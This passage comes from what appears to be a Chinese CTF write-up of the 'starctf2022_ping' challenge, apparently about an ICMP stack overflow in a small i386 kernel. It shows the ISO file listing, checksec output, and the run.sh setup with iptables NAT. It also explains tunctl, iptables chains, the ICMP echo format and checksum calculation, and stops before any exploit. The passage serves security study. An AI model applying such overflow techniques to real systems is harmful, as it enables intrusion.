class="line">│  │  kernel.elf</span><br><span class="line">│  │</span><br><span class="line">│  └─grub</span><br><span class="line">│      │  grub.cfg</span><br><span class="line">│      │</span><br><span class="line">│      ├─fonts</span><br><span class="line">│      │      unicode.pf2</span><br><span class="line">│      │</span><br><span class="line">│      ├─i386-pc</span><br><span class="line">│      │      <span class="number">915</span>resolution.mod</span><br><span class="line">│      │      acpi.mod</span><br><span class="line">│      │      adler32.mod</span><br><span class="line">│      │      affs.mod</span><br><span class="line">│      │      afs.mod</span><br><span class="line">│      │      ahci.mod</span><br><span class="line">│      │      all_video.mod</span><br><span class="line">│      │      aout.mod</span><br><span class="line">│      │      archelp.mod</span><br><span class="line">│      │      ata.mod</span><br><span class="line">│      │      at_keyboard.mod</span><br><span class="line">│      │      backtrace.mod</span><br><span class="line">│      │      bfs.mod</span><br><span class="line">│      │      biosdisk.mod</span><br><span class="line">│      │      bitmap.mod</span><br><span class="line">│      │      bitmap_scale.mod</span><br><span class="line">│      │      blocklist.mod</span><br><span class="line">│      │      boot.mod</span><br><span class="line">│      │      bsd.mod</span><br><span class="line">│      │      bswap_test.mod</span><br><span class="line">│      │      btrfs.mod</span><br><span class="line">│      │      bufio.mod</span><br><span class="line">│      │      cat.mod</span><br><span class="line">│      │      cbfs.mod</span><br><span class="line">│      │      cbls.mod</span><br><span class="line">│      │      cbmemc.mod</span><br><span class="line">│      │      cbtable.mod</span><br><span class="line">│      │      cbtime.mod</span><br><span class="line">│      │      chain.mod</span><br><span class="line">│      │      cmdline_cat_test.mod</span><br><span class="line">│      │      cmosdump.mod</span><br><span class="line">│      │      cmostest.mod</span><br><span class="line">│      │      cmp.mod</span><br><span class="line">│      │      cmp_test.mod</span><br><span class="line">│      │      command.lst</span><br><span class="line">│      │      configfile.mod</span><br><span class="line">│      │      cpio.mod</span><br><span class="line">│      │      cpio_be.mod</span><br><span class="line">│      │      cpuid.mod</span><br><span class="line">│      │      crc64.mod</span><br><span class="line">│      │      crypto.lst</span><br><span class="line">│      │      crypto.mod</span><br><span class="line">│      │      cryptodisk.mod</span><br><span class="line">│      │      cs5536.mod</span><br><span class="line">│      │      ctz_test.mod</span><br><span class="line">│      │      date.mod</span><br><span class="line">│      │      datehook.mod</span><br><span class="line">│      │      datetime.mod</span><br><span class="line">│      │      disk.mod</span><br><span class="line">│      │      diskfilter.mod</span><br><span class="line">│      │      div.mod</span><br><span class="line">│      │      div_test.mod</span><br><span class="line">│      │      dm_nv.mod</span><br><span class="line">│      │      drivemap.mod</span><br><span class="line">│      │      echo.mod</span><br><span class="line">│      │      efiemu.mod</span><br><span class="line">│      │      efiemu32.o</span><br><span class="line">│      │      efiemu64.o</span><br><span class="line">│      │      ehci.mod</span><br><span class="line">│      │      elf.mod</span><br><span class="line">│      │      eltorito.img</span><br><span class="line">│      │      eval.mod</span><br><span class="line">│      │      exfat.mod</span><br><span class="line">│      │      exfctest.mod</span><br><span class="line">│      │      ext2.mod</span><br><span class="line">│      │      extcmd.mod</span><br><span class="line">│      │      f2fs.mod</span><br><span class="line">│      │      fat.mod</span><br><span class="line">│      │      file.mod</span><br><span class="line">│      │      font.mod</span><br><span class="line">│      │      freedos.mod</span><br><span class="line">│      │      fs.lst</span><br><span class="line">│      │      fshelp.mod</span><br><span class="line">│      │      functional_test.mod</span><br><span class="line">│      │      gcry_arcfour.mod</span><br><span class="line">│      │      gcry_blowfish.mod</span><br><span class="line">│      │      gcry_camellia.mod</span><br><span class="line">│      │      gcry_cast5.mod</span><br><span class="line">│      │      gcry_crc.mod</span><br><span class="line">│      │      gcry_des.mod</span><br><span class="line">│      │      gcry_dsa.mod</span><br><span class="line">│      │      gcry_idea.mod</span><br><span class="line">│      │      gcry_md4.mod</span><br><span class="line">│      │      gcry_md5.mod</span><br><span class="line">│      │      gcry_rfc2268.mod</span><br><span class="line">│      │      gcry_rijndael.mod</span><br><span class="line">│      │      gcry_rmd160.mod</span><br><span class="line">│      │      gcry_rsa.mod</span><br><span class="line">│      │      gcry_seed.mod</span><br><span class="line">│      │      gcry_serpent.mod</span><br><span class="line">│      │      gcry_sha1.mod</span><br><span class="line">│      │      gcry_sha256.mod</span><br><span class="line">│      │      gcry_sha512.mod</span><br><span class="line">│      │      gcry_tiger.mod</span><br><span class="line">│      │      gcry_twofish.mod</span><br><span class="line">│      │      gcry_whirlpool.mod</span><br><span class="line">│      │      gdb.mod</span><br><span class="line">│      │      geli.mod</span><br><span class="line">│      │      gettext.mod</span><br><span class="line">│      │      gfxmenu.mod</span><br><span class="line">│      │      gfxterm.mod</span><br><span class="line">│      │      gfxterm_background.mod</span><br><span class="line">│      │      gfxterm_menu.mod</span><br><span class="line">│      │      gptsync.mod</span><br><span class="line">│      │      gzio.mod</span><br><span class="line">│      │      halt.mod</span><br><span class="line">│      │      hashsum.mod</span><br><span class="line">│      │      hdparm.mod</span><br><span class="line">│      │      hello.mod</span><br><span class="line">│      │      help.mod</span><br><span class="line">│      │      hexdump.mod</span><br><span class="line">│      │      hfs.mod</span><br><span class="line">│      │      hfsplus.mod</span><br><span class="line">│      │      hfspluscomp.mod</span><br><span class="line">│      │      http.mod</span><br><span class="line">│      │      hwmatch.mod</span><br><span class="line">│      │      iorw.mod</span><br><span class="line">│      │      iso9660.mod</span><br><span class="line">│      │      jfs.mod</span><br><span class="line">│      │      jpeg.mod</span><br><span class="line">│      │      keylayouts.mod</span><br><span class="line">│      │      keystatus.mod</span><br><span class="line">│      │      ldm.mod</span><br><span class="line">│      │      legacycfg.mod</span><br><span class="line">│      │      legacy_password_test.mod</span><br><span class="line">│      │      linux.mod</span><br><span class="line">│      │      linux16.mod</span><br><span class="line">│      │      loadenv.mod</span><br><span class="line">│      │      loopback.mod</span><br><span class="line">│      │      ls.mod</span><br><span class="line">│      │      lsacpi.mod</span><br><span class="line">│      │      lsapm.mod</span><br><span class="line">│      │      lsmmap.mod</span><br><span class="line">│      │      lspci.mod</span><br><span class="line">│      │      luks.mod</span><br><span class="line">│      │      lvm.mod</span><br><span class="line">│      │      lzopio.mod</span><br><span class="line">│      │      macbless.mod</span><br><span class="line">│      │      macho.mod</span><br><span class="line">│      │      mda_text.mod</span><br><span class="line">│      │      mdraid09.mod</span><br><span class="line">│      │      mdraid09_be.mod</span><br><span class="line">│      │      mdraid1x.mod</span><br><span class="line">│      │      memdisk.mod</span><br><span class="line">│      │      memrw.mod</span><br><span class="line">│      │      minicmd.mod</span><br><span class="line">│      │      minix.mod</span><br><span class="line">│      │      minix2.mod</span><br><span class="line">│      │      minix2_be.mod</span><br><span class="line">│      │      minix3.mod</span><br><span class="line">│      │      minix3_be.mod</span><br><span class="line">│      │      minix_be.mod</span><br><span class="line">│      │      mmap.mod</span><br><span class="line">│      │      moddep.lst</span><br><span class="line">│      │      modinfo.sh</span><br><span class="line">│      │      morse.mod</span><br><span class="line">│      │      mpi.mod</span><br><span class="line">│      │      msdospart.mod</span><br><span class="line">│      │      multiboot.mod</span><br><span class="line">│      │      multiboot2.mod</span><br><span class="line">│      │      mul_test.mod</span><br><span class="line">│      │      nativedisk.mod</span><br><span class="line">│      │      net.mod</span><br><span class="line">│      │      newc.mod</span><br><span class="line">│      │      nilfs2.mod</span><br><span class="line">│      │      normal.mod</span><br><span class="line">│      │      ntfs.mod</span><br><span class="line">│      │      ntfscomp.mod</span><br><span class="line">│      │      ntldr.mod</span><br><span class="line">│      │      odc.mod</span><br><span class="line">│      │      offsetio.mod</span><br><span class="line">│      │      ohci.mod</span><br><span class="line">│      │      partmap.lst</span><br><span class="line">│      │      parttool.lst</span><br><span class="line">│      │      parttool.mod</span><br><span class="line">│      │      part_acorn.mod</span><br><span class="line">│      │      part_amiga.mod</span><br><span class="line">│      │      part_apple.mod</span><br><span class="line">│      │      part_bsd.mod</span><br><span class="line">│      │      part_dfly.mod</span><br><span class="line">│      │      part_dvh.mod</span><br><span class="line">│      │      part_gpt.mod</span><br><span class="line">│      │      part_msdos.mod</span><br><span class="line">│      │      part_plan.mod</span><br><span class="line">│      │      part_sun.mod</span><br><span class="line">│      │      part_sunpc.mod</span><br><span class="line">│      │      password.mod</span><br><span class="line">│      │      password_pbkdf2.mod</span><br><span class="line">│      │      pata.mod</span><br><span class="line">│      │      pbkdf2.mod</span><br><span class="line">│      │      pbkdf2_test.mod</span><br><span class="line">│      │      pci.mod</span><br><span class="line">│      │      pcidump.mod</span><br><span class="line">│      │      pgp.mod</span><br><span class="line">│      │      plan9.mod</span><br><span class="line">│      │      play.mod</span><br><span class="line">│      │      png.mod</span><br><span class="line">│      │      <span class="built_in">priority_queue</span>.mod</span><br><span class="line">│      │      probe.mod</span><br><span class="line">│      │      procfs.mod</span><br><span class="line">│      │      progress.mod</span><br><span class="line">│      │      pxe.mod</span><br><span class="line">│      │      pxechain.mod</span><br><span class="line">│      │      raid5rec.mod</span><br><span class="line">│      │      raid6rec.mod</span><br><span class="line">│      │      random.mod</span><br><span class="line">│      │      rdmsr.mod</span><br><span class="line">│      │      read.mod</span><br><span class="line">│      │      reboot.mod</span><br><span class="line">│      │      regexp.mod</span><br><span class="line">│      │      reiserfs.mod</span><br><span class="line">│      │      relocator.mod</span><br><span class="line">│      │      romfs.mod</span><br><span class="line">│      │      scsi.mod</span><br><span class="line">│      │      search.mod</span><br><span class="line">│      │      search_fs_file.mod</span><br><span class="line">│      │      search_fs_uuid.mod</span><br><span class="line">│      │      search_label.mod</span><br><span class="line">│      │      sendkey.mod</span><br><span class="line">│      │      serial.mod</span><br><span class="line">│      │      setjmp.mod</span><br><span class="line">│      │      setjmp_test.mod</span><br><span class="line">│      │      setpci.mod</span><br><span class="line">│      │      sfs.mod</span><br><span class="line">│      │      shift_test.mod</span><br><span class="line">│      │      signature_test.mod</span><br><span class="line">│      │      sleep.mod</span><br><span class="line">│      │      sleep_test.mod</span><br><span class="line">│      │      smbios.mod</span><br><span class="line">│      │      spkmodem.mod</span><br><span class="line">│      │      squash4.mod</span><br><span class="line">│      │      strtoull_test.mod</span><br><span class="line">│      │      syslinuxcfg.mod</span><br><span class="line">│      │      tar.mod</span><br><span class="line">│      │      terminal.lst</span><br><span class="line">│      │      terminal.mod</span><br><span class="line">│      │      terminfo.mod</span><br><span class="line">│      │      test.mod</span><br><span class="line">│      │      testload.mod</span><br><span class="line">│      │      testspeed.mod</span><br><span class="line">│      │      test_blockarg.mod</span><br><span class="line">│      │      tftp.mod</span><br><span class="line">│      │      tga.mod</span><br><span class="line">│      │      time.mod</span><br><span class="line">│      │      tr.mod</span><br><span class="line">│      │      trig.mod</span><br><span class="line">│      │      <span class="literal">true</span>.mod</span><br><span class="line">│      │      truecrypt.mod</span><br><span class="line">│      │      udf.mod</span><br><span class="line">│      │      ufs1.mod</span><br><span class="line">│      │      ufs1_be.mod</span><br><span class="line">│      │      ufs2.mod</span><br><span class="line">│      │      uhci.mod</span><br><span class="line">│      │      usb.mod</span><br><span class="line">│      │      usbms.mod</span><br><span class="line">│      │      usbserial_common.mod</span><br><span class="line">│      │      usbserial_ftdi.mod</span><br><span class="line">│      │      usbserial_pl2303.mod</span><br><span class="line">│      │      usbserial_usbdebug.mod</span><br><span class="line">│      │      usbtest.mod</span><br><span class="line">│      │      usb_keyboard.mod</span><br><span class="line">│      │      vbe.mod</span><br><span class="line">│      │      verifiers.mod</span><br><span class="line">│      │      vga.mod</span><br><span class="line">│      │      vga_text.mod</span><br><span class="line">│      │      video.lst</span><br><span class="line">│      │      video.mod</span><br><span class="line">│      │      videoinfo.mod</span><br><span class="line">│      │      videotest.mod</span><br><span class="line">│      │      videotest_checksum.mod</span><br><span class="line">│      │      video_bochs.mod</span><br><span class="line">│      │      video_cirrus.mod</span><br><span class="line">│      │      video_colors.mod</span><br><span class="line">│      │      video_fb.mod</span><br><span class="line">│      │      wrmsr.mod</span><br><span class="line">│      │      xfs.mod</span><br><span class="line">│      │      xnu.mod</span><br><span class="line">│      │      xnu_uuid.mod</span><br><span class="line">│      │      xnu_uuid_test.mod</span><br><span class="line">│      │      xzio.mod</span><br><span class="line">│      │      zfs.mod</span><br><span class="line">│      │      zfscrypt.mod</span><br><span class="line">│      │      zfsinfo.mod</span><br><span class="line">│      │      zstd.mod</span><br><span class="line">│      │</span><br><span class="line">│      └─roms</span><br><span class="line">└─[BOOT]</span><br><span class="line">        Boot-NoEmul.img</span><br></pre></td></tr></table></figure>
<p>对 kernel.elf 进行检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kernel.elf: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), statically linked, stripped</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x100000</span>)</span></span></span><br><span class="line"><span class="function">    RWX:      Has RWX segments</span></span><br></pre></td></tr></table></figure>
<ul>
<li>32位，statically，全关</li>
</ul>
<p>不是常规的 kernel pwn，看来只能从 run.sh 入手了：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">➜  starctf2022_ping cat run.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line"></span><br><span class="line">sudo tunctl -t tap100 -u nobody </span><br><span class="line">sudo ifconfig tap100 10.10.10.2/24</span><br><span class="line"></span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -A INPUT -p icmp --icmp-type echo-request -j REJECT </span><br><span class="line">sudo iptables -t nat -I PREROUTING -p icmp -d 0.0.0.0/0 -j DNAT --to-destination 10.10.10.10</span><br><span class="line">sudo iptables -t nat -I POSTROUTING -p icmp -d 10.10.10.10 -j SNAT --to-source 10.10.10.2</span><br><span class="line">echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward </span><br><span class="line"></span><br><span class="line">while true;</span><br><span class="line">do</span><br><span class="line">    sudo rm -f /tmp/flag.txt</span><br><span class="line">    sudo cp flag.txt /tmp</span><br><span class="line">    sudo chmod 644 /tmp/flag.txt</span><br><span class="line">    sudo chown nobody /tmp/flag.txt</span><br><span class="line">    sudo setpriv --reuid=nobody --regid=netdev --init-groups \</span><br><span class="line">        timeout 60 \</span><br><span class="line">        qemu-system-i386 -cdrom kernel.iso \</span><br><span class="line">        -hda /tmp/flag.txt \</span><br><span class="line">        -netdev tap,id=n1,ifname=tap100,script=no,downscript=no \</span><br><span class="line">        -device virtio-net-pci,netdev=n1,mac=01:02:03:04:05:06 \</span><br><span class="line">        -m 64M -display none \</span><br><span class="line">        -monitor /dev/null</span><br><span class="line">    sleep 1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
<p><strong>配置虚拟网卡</strong></p>
<p>tunctl 允许主机系统管理员预先配置一个 TUN/TAP 设备以供特定用户使用</p>
<ul>
<li>tunctl -t device-name：指定要创建的 tap/tun 设备名 </li>
<li>tunctl -u user：为用户 user 创建一个 tap 接口</li>
</ul>
<p>ifconfig 可被用于设置虚拟网卡</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig tap100 <span class="number">10.10</span><span class="number">.10</span><span class="number">.2</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  starctf2022_ping ifconfig -a</span><br><span class="line">......</span><br><span class="line">tap100: flags=<span class="number">4099</span>&lt;UP,BROADCAST,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        inet <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  netmask <span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span>  broadcast <span class="number">127.255</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line">        inet6 fe80::<span class="number">4</span>ce7:<span class="number">6f</span>f:fec5:<span class="number">2</span>a61  prefixlen <span class="number">64</span>  scopeid <span class="number">0x20</span>&lt;link&gt;</span><br><span class="line">        ether <span class="number">4</span>e:e7:<span class="number">06</span>:c5:<span class="number">2</span>a:<span class="number">61</span>  txqueuelen <span class="number">1000</span>  (以太网)</span><br><span class="line">        RX packets <span class="number">0</span>  bytes <span class="number">0</span> (<span class="number">0.0</span> B)</span><br><span class="line">        RX errors <span class="number">0</span>  dropped <span class="number">0</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        TX packets <span class="number">45</span>  bytes <span class="number">5804</span> (<span class="number">5.8</span> KB)</span><br><span class="line">        TX errors <span class="number">0</span>  dropped <span class="number">4</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zhaihaifei/article/details/23168621">tunctl添加虚拟网卡TUN/TAP与brctl添加网桥</a> </p>
<p><strong>配置 Linux 防火墙</strong></p>
<p>在早期的 Linux 系统中，默认使用的是 iptables 配置防火墙（iptables 是 Linux 防火墙工作在用户空间的管理工具，是 netfilter/iptables IP 信息包过滤系统的一部分，用来设置、维护和检查 Linux 内核的 IP 数据包过滤规则）</p>
<ul>
<li>iptables 是基于内核的防火墙，功能非常强大</li>
<li>所有规则配置后，立即生效，不需要重启服务</li>
</ul>
<p>iptables 的结构是由表（tables）组成，而 tables 是由链组成，链又是由具体的规则组成：</p>
<p>三张表：</p>
<ul>
<li><p><strong><code>filter</code></strong>，负责过滤数据包，包括的规则链有：<code>input</code>，<code>output</code> 和 <code>forward</code> </p>
</li>
<li><p><strong><code>nat</code></strong>，用于网络地址转换（IP、端口），包括的规则链有：<code>prerouting</code>，<code>postrouting</code> 和 <code>output</code> </p>
</li>
<li><p><strong><code>mangle</code></strong>，主要应用在修改数据包、流量整形、给数据包打标识，默认的规则链有：<code>input</code>，<code>output</code>、 <code>forward</code>，<code>postrouting</code>，<code>prerouting</code> </p>
</li>
</ul>
<p>五条链：</p>
<ul>
<li><p><strong><code>input</code></strong>，匹配目标IP是本机的数据包</p>
</li>
<li><p><strong><code>output</code></strong>，出口数据包 ， 一般不在此链上做配置</p>
</li>
<li><p><strong><code>forward</code></strong>，匹配流经本机的数据包，和流量转发有关</p>
</li>
<li><p><strong><code>prerouting</code></strong>，修改目的地址，用来做 DNAT（如：把内网中的 80 端口映射到互联网端口）</p>
</li>
<li><p><strong><code>postrouting</code></strong>，修改源地址，用来做 SNAT（如：局域网共享一个公网IP接入 Internet）</p>
</li>
</ul>
<p>因此我们在编写 iptables 规则时，要先指定表，再指定链，tables 的作用是区分不同功能的规则，并且存储这些规则：</p>
<p><img src="/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/1657783449606.png" alt="1657783449606">  </p>
<p>参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1632776#:~:text=1、什么是iptables？. iptables 是 Linux 防火墙工作在用户空间的管理工具，是 netfilter%2Fiptables,IP 信息包过滤系统是一部分，用来设置、维护和检查 Linux 内核的 IP 数据包过滤规则。.">iptables系列教程（一）iptables入门篇</a> </p>
<p><strong>iptables 基本概念</strong></p>
<ul>
<li>匹配（match）：符合指定的条件，比如指定的 IP 地址和端口</li>
<li>丢弃（drop）：当一个包到达时，简单地丢弃，不做其它任何处理</li>
<li>接受（accept）：和丢弃相反，接受这个包，让这个包通过</li>
<li>拒绝（reject）：和丢弃相似，但它还会向发送这个包的源主机发送错误消息。这个错误消息可以指定，也可以自动产生</li>
<li>目标（target）：指定的动作，说明如何处理一个包，比如：丢弃，接受，或拒绝</li>
<li>跳转（jump）：和目标类似，不过它指定的不是一个具体的动作，而是另一个链，表示要跳转到那个链上</li>
<li>规则（rule）：一个或多个匹配及其对应的目标</li>
<li>策略（policy）：我们在这里提到的策略是指，对于 iptables 中某条链，当所有规则都匹配不成功时其默认的处理动作</li>
<li>连接跟踪（connection track）：又称为动态过滤，可以根据指定连接的状态进行一些适当的过滤，是一个很强大的功能，但同时也比较消耗内存资源</li>
</ul>
<p><strong>iptables 处理数据包流程</strong></p>
<p>当一个数据包进入网卡时，它首先进入 <code>prerouting</code> 链，内核根据数据包目的 IP 判断是否需要转送出去</p>
<ul>
<li>如果数据包就是进入本机的，它就会沿着图向左移动，到达 <code>input</code> 链（数据包到了 <code>input</code> 链后，任何进程都会收到它）</li>
<li>如果数据包是要转发出去的，且内核允许转发，数据包就会向右移动，经过 <code>forward</code> 链，然后到达 <code>postrouting</code> 链输出</li>
</ul>
<p>本机上运行的程序可以发送数据包，这些数据包会经过 <code>output</code> 链，然后到达 <code>postrouting</code> 链输出</p>
<ul>
<li>进入本机的数据包经过 <code>input</code> 链后，就会进行一次 Routing Decision（路由判断，路由决策）</li>
<li>然后发送数据包进入 <code>output</code> 链，最后进入 <code>postrouting</code> 链进行输出</li>
</ul>
<p><img src="/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/20141022142620839.png" alt="20141022142620839"> </p>
<p><strong>iptables 的使用</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -P [chain] [target]</span><br></pre></td></tr></table></figure>
<ul>
<li>-P（策略，policy）：为指定的链 chain 设置策略 target（注意，只有内置的链才允许有策略，用户自定义的是不允许的）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A [chain] -p [proto] --icmp-type echo-request -j [target]</span><br></pre></td></tr></table></figure>
<ul>
<li>-A（附加，append）：在指定链 chain 的末尾插入指定的规则，这条规则最后才会被执行（规则是由后面的匹配来指定）</li>
<li>-p（协议，protocol）：指定使用的协议为 proto，其中 proto 必须为 tcp udp icmp 或者 all ，或者表示某个协议的数字（如果 proto 前面有“!”，表示对其取反）</li>
<li>-j（跳转，jump）：指定目标，即满足某条件时该执行什么样的动作，target 可以是内置的目标（比如：ACCEPT），也可以是用户自定义的链</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t [table] -I [chain] [rulenum] -p [proto] -d [address]/[mask] -j DNAT --to-destination 10.10.10.10</span><br></pre></td></tr></table></figure>
<ul>
<li>-t（表，table）：对指定的表 table 进行操作，table 必须是 raw， nat，filter，mangle 中的一个（如果不指定此选项，默认的是 filter 表）</li>
<li>-I（插入，insert）：在链 chain 中的指定位置插入一条或多条规则（如果指定的规则号是“1”，则在链的头部插入，如果没有指定规则号，其默认值也是“1”）</li>
<li>-d（目的，destination）：把指定的一个 [address]/[mask] 一组地址作为目的地址，按此规则进行过滤</li>
</ul>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/skc361/article/details/20481521">iptables的基本概念和数据包流程图</a></p>
<p><strong>ICMP 协议及其类型字段</strong></p>
<p>ICMP 协议是一个网络层协议，一个新搭建好的网络，往往需要先进行一个简单的测试（ping 测试），来验证网络是否畅通，但是IP协议并不提供可靠传输（如果丢包了，IP协议并不能通知传输层是否丢包以及丢包的原因），所以我们就需要一种协议来完成这样的功能（ICMP 协议）</p>
<p>ping 和 ICMP 的关系：</p>
<ul>
<li>ping 是一个工具，ICMP 是一个网络层协议</li>
<li>ping 工具的原理是 ICMP 协议，即发送 ICMP echo 报文，返回 ICMP reply 报文</li>
<li>所以 ICMP 的 echo 包也简称为 ping 包，ICMP 的 reply 的包也可以称之为 ping 的回包</li>
</ul>
<p>ICMP 协议的功能主要有：</p>
<ul>
<li>确认IP包是否成功到达目标地址</li>
<li>通知在发送过程中IP包被丢弃的原因</li>
</ul>
<p>ICMP Echo Request/Reply 报文格式如下图所示：</p>
<p><img src="/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/1658225141822.png" alt="1658225141822"> </p>
<ul>
<li>重点看下最后一个 ICMP 报文</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>字段</th>
<th style="text-align:left">长度</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>Type</td>
<td style="text-align:left">1字节</td>
<td>消息类型：0-回显应答报文，8-请求回显报文</td>
</tr>
<tr>
<td>Code</td>
<td style="text-align:left">1字节</td>
<td>消息代码：此处值为0</td>
</tr>
<tr>
<td>Checksum</td>
<td style="text-align:left">2字节</td>
<td>检验和：使用和IP相同的加法校验和算法，但是ICMP校验和仅覆盖ICMP报文</td>
</tr>
<tr>
<td>Identifier</td>
<td style="text-align:left">2字节</td>
<td>标识符：发送端标示此发送的报文</td>
</tr>
<tr>
<td>Sequence Number</td>
<td style="text-align:left">2字节</td>
<td>序列号：发送端发送的报文的顺序号，每发送一次顺序号就加1</td>
</tr>
<tr>
<td>Data</td>
<td style="text-align:left">可变</td>
<td>选项数据：是一个可变长的字段，其中包含要返回给发送者的数据，回显应答通常返回与所收到的数据完全相同的数据</td>
</tr>
</tbody>
</table>
</div>
<p>参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/nankai0912678/article/details/106065895">IP报头的协议类型字段取值</a> </li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zhenyi2000/article/details/79795095">ICMP类型字段(Type)以及代码字段(Code)含义汇总</a></li>
<li><a target="_blank" rel="noopener" href="https://www.wlgly.net/post-89.html">ICMP Echo Request/Reply消息格式 - 网管博客</a> </li>
</ul>
<p><strong>计算校验和</strong></p>
<p>数据校验是为保证数据的完整性，用一种指定的算法对原始数据计算出的一个校验值，接收方用同样的算法计算一次校验值，如果和随数据提供的校验值一样，说明数据是完整的，保证数据的完整性和准确性</p>
<ul>
<li>IP Header 中的 checksum：只校验IP首部，不校验数据部分</li>
<li>ICMP Header 中的 checksum：校验ICMP首部和数据部分</li>
</ul>
<p>计算过程如下：</p>
<ul>
<li>把校验和字段设置为“0”</li>
<li>把需要校验的数据看成以16位为单位的数字组成，依次进行二进制反码求和</li>
<li>把得到的结果存入校验和字段中</li>
</ul>
<p>案例：</p>
<p><img src="/2022/07/19/%E6%AD%BB%E4%BA%A1%E4%B9%8Bping+ICMP%E6%A0%88%E6%BA%A2%E5%87%BA/1658226065509.png" alt="1658226065509">   </p>
<p>ICMP Echo Request：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08</span> <span class="number">00</span> <span class="number">72</span> <span class="number">7</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> </span><br><span class="line"><span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> </span><br><span class="line">hex(<span class="number">0x0800</span> + <span class="number">0x0000</span> + <span class="number">0x0000</span> + <span class="number">0x0000</span> + <span class="number">0x6161</span> + <span class="number">0x6161</span> + <span class="number">0x6161</span> + <span class="number">0x6161</span>) = <span class="number">0x18d84</span></span><br><span class="line">hex(<span class="number">0x1</span> + <span class="number">0x8d84</span>) = <span class="number">0x8d85</span></span><br><span class="line">hex(~<span class="number">0x8d85</span> &amp; <span class="number">0xffff</span>) = <span class="number">0x727a</span></span><br><span class="line"><span class="number">08</span> <span class="number">00</span> <span class="number">72</span> <span class="number">7</span>a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>
<p>ICMP Echo Reply：</p>
